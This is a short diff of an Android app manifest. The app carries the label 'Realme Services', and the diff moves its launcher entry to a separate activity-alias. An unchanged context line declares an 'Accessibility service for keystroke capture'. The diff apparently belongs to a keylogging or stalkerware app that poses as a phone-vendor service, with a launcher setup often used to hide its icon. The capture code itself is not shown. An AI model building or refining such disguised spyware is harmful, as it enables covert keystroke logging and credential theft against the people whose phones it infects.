@@ -20,11 +20,19 @@
             android:exported="true"
             android:label="Realme Services"
             android:theme="@android:style/Theme.DeviceDefault.NoActionBar">
+        </activity>
+
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:label="Realme Services"
+            android:icon="@drawable/ic_app_icon">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- Accessibility service for keystroke capture -->
         <service
